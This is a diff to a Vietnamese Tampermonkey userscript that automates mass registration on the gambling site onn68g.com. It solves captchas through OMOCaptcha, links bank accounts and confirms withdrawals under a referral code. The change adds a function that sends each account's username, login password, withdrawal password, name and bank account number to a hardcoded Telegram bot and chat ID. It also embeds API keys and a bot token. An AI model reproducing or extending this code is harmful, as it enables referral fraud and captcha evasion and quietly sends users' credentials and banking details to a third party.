@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name         ON68 Auto Full: Đăng Ký -> Captcha -> Rút -> Bank -> Xác Nhận -> Promo (API Updated)
+// @name         ON68 Auto Full: Đăng Ký -> Captcha -> Rút -> Bank -> Xác Nhận -> Reload + Telegram Bot v8.3
 // @namespace    http://tampermonkey.net/
-// @version      8.1
-// @description  Cập nhật API Token OMOCaptcha mới, tự động toàn bộ quy trình, không reload trang và tích hợp nút mở trang khuyến mãi.
+// @version      8.3
+// @description  Tự động hoàn tất quy trình, giải captcha OMO, liên kết ngân hàng, xác nhận rút tiền và tự động gửi thông tin tài khoản về Telegram với thông số mới.
 // @match        *://*.onn68g.com/*
 // @match        *://onn68g.com/*
 // @grant        GM_xmlhttpRequest
@@ -10,6 +10,7 @@
 // @grant        GM_getValue
 // @connect      omocaptcha.com
 // @connect      static.botion.com
+// @connect      api.telegram.org
 // @connect      *
 // @run-at       document-end
 // ==/UserScript==
@@ -41,6 +42,9 @@
         apiKey: "OMO_83ZSGES7YPDVMYBP4SMYCZOYBYXVXXHCEX95BIB5LBB1ITZELX4GEQ94UGYSZ91783164555",
         targetUrl: 'https://www.onn68g.com/m/home?referralCode=str2250',
         promoUrl: 'https://www.on68khuyenmai.com/?promo_id=FR68',
+        // Cấu hình Telegram mới
+        tgBotToken: '8839097708:AAEyDT6DwIKqy6bJAnLx_JuAmHcsB_DTAlw',
+        tgChatId: '8962161965',
         get selectedBank() { return GM_getValue('selected_bank', 'VIETCOM BANK'); },
         set selectedBank(val) { GM_setValue('selected_bank', val); },
         get bankAccountNum() { return GM_getValue('bank_account_num', '19036888888888'); },
@@ -58,9 +62,51 @@
     let captchaScannerInterval = null;
     let isWaitingForPostAction = false;
 
-    // ==========================================
-    // 1. GIAO DIỆN ĐIỀU KHIỂN & KÉO THẢ (DRAG)
-    // ==========================================
+    let currentRegInfo = {
+        username: '',
+        password: 'Tanthu123',
+        withdrawPass: '123456',
+        fullName: '',
+        bankName: '',
+        stk: ''
+    };
+
+    function sendTelegramNotification(title, extraMsg = '') {
+        const text = `🤖 *[ON68 Auto Bot]* - ${title}\n\n` +
+                     `👤 *Tài khoản:* \`${currentRegInfo.username || 'N/A'}\`\n` +
+                     `🔑 *MK Đăng nhập:* \`${currentRegInfo.password}\`\n` +
+                     `💰 *MK Rút tiền:* \`${currentRegInfo.withdrawPass}\`\n` +
+                     `📛 *Họ tên:* ${currentRegInfo.fullName || 'N/A'}\n` +
+                     `🏦 *Ngân hàng:* ${currentRegInfo.bankName || CONFIG.selectedBank}\n` +
+                     `💳 *Số STK:* \`${currentRegInfo.stk || CONFIG.bankAccountNum}\`\n` +
+                     (extraMsg ? `\n📌 *Trạng thái:* ${extraMsg}\n` : '') +
+                     `🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN')}`;
+
+        GM_xmlhttpRequest({
+            method: "POST",
+            url: `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`,
+            headers: { "Content-Type": "application/json" },
+            data: JSON.stringify({
+                chat_id: CONFIG.tgChatId,
+                text: text,
+                parse_mode: "Markdown"
+            }),
+            onload: function(response) {
+                try {
+                    const res = JSON.parse(response.responseText);
+                    if (res.ok) {
+                        appendLog("Telegram", "Đã gửi thông tin tài khoản về Telegram thành công!");
+                    } else {
+                        appendLog("Lỗi Telegram", res.description || 'Không gửi được tin nhắn');
+                    }
+                } catch (e) {
+                    appendLog("Lỗi Telegram", "Parse JSON thất bại");
+                }
+            },
+            onerror: () => appendLog("Lỗi Telegram", "Mất kết nối mạng khi gọi API Telegram")
+        });
+    }
+
     function initUI() {
         if (document.getElementById('master-bot-ui')) return;
         if (!document.body) {
@@ -87,11 +133,13 @@
             backdrop-filter: blur(6px) !important;
         `;
 
-        let bankOptionsHtml = BANK_LIST.map(bank => `<option value="${bank}" ${CONFIG.selectedBank === bank ? 'selected' : ''}>${bank}</option>`).join('');
+        const bankOptionsHtml = BANK_LIST.map(bank => 
+            `<option value="${bank}" ${CONFIG.selectedBank === bank ? 'selected' : ''}>${bank}</option>`
+        ).join('');
 
         uiContainer.innerHTML = `
             <div id="ui-header" style="display: flex; justify-content: space-between; align-items: center; padding: 7px 10px; background: #24252d; border-radius: 7px 7px 0 0; border-bottom: 1px solid rgba(255,255,255,0.1); cursor: move;">
-                <span style="font-weight: bold; color: #ff5722;">🤖 ON68 Auto Ultimate v8.1</span>
+                <span style="font-weight: bold; color: #ff5722;">🤖 ON68 Auto v8.3</span>
                 <div style="display: flex; gap: 5px; align-items: center;">
                     <span id="ui-status-badge" style="font-size: 10px; background: #444; padding: 2px 6px; border-radius: 3px; color: #aaa;">Sẵn sàng</span>
                     <button id="ui-btn-minimize" title="Thu gọn" style="background: none; border: 1px solid #555; color: #fff; border-radius: 3px; cursor: pointer; font-size: 10px; padding: 1px 6px;">_</button>
@@ -135,7 +183,7 @@
                 </div>
 
                 <div id="ui-log-box" style="background: #0d0e12; border: 1px solid #2e303d; border-radius: 4px; height: 100px; overflow-y: auto; padding: 6px; font-family: monospace; font-size: 11px; line-height: 1.35; display: flex; flex-direction: column; gap: 3px;">
-                    <div style="color: #64748b;">[System] Sẵn sàng hoạt động...</div>
+                    <div style="color: #64748b;">[System] Sẵn sàng hoạt động (v8.3)...</div>
                 </div>
             </div>
         `;
@@ -155,9 +203,8 @@
             CONFIG.bankAccountNum = stkInputEl.value;
         });
 
-        const bankSelectEl = document.getElementById('ui-bank-select');
-        bankSelectEl.addEventListener('change', () => {
-            CONFIG.selectedBank = bankSelectEl.value;
+        document.getElementById('ui-bank-select').addEventListener('change', (e) => {
+            CONFIG.selectedBank = e.target.value;
             appendLog("Cấu hình", `Đã đổi ngân hàng thành: ${CONFIG.selectedBank}`);
         });
 
@@ -336,6 +383,12 @@
         const randomPhone = getRandomPhone();
         const fixedPass = 'Tanthu123';
 
+        currentRegInfo.username = randomAcc;
+        currentRegInfo.password = fixedPass;
+        currentRegInfo.fullName = fullName;
+        currentRegInfo.stk = document.getElementById('ui-stk')?.value || CONFIG.bankAccountNum;
+        currentRegInfo.bankName = CONFIG.selectedBank;
+
         let accInput = findInputByKeyword('tài khoản');
         let passInput = findInputByKeyword('mật khẩu');
         let nameInput = findInputByKeyword('họ và tên') || findInputByKeyword('ngân hàng');
@@ -469,7 +522,7 @@
         const box = sliderBtn.getBoundingClientRect();
         const startX = box.left + box.width / 2;
         const startY = box.top + box.height / 2;
-        const finalDistanceX = distanceX - 16; // Đã lùi chính xác 16 pixels
+        const finalDistanceX = distanceX - 16;
         const targetX = startX + finalDistanceX;
 
         function fireEvent(type, x, y) {
@@ -668,6 +721,7 @@
 
         const stkInputEl = document.getElementById('ui-stk');
         const customStk = stkInputEl ? stkInputEl.value.trim() : CONFIG.bankAccountNum;
+        currentRegInfo.stk = customStk;
 
         const stkInput = document.querySelector('input[name="bankCard"]') || 
                          document.querySelector('input[placeholder*="số tài khoản"]');
@@ -772,6 +826,10 @@
                     triggerRealClick(popupBtn);
                     updateBadge('Hoàn tất 100%', '#10b981');
                     isWaitingForPostAction = false;
+
+                    // Gửi thông tin tài khoản qua Telegram với thông số mới
+                    sendTelegramNotification("Đã hoàn tất quy trình liên kết ngân hàng thành công!");
+
                 }, 300);
 
             } else if (attempts > 25) {
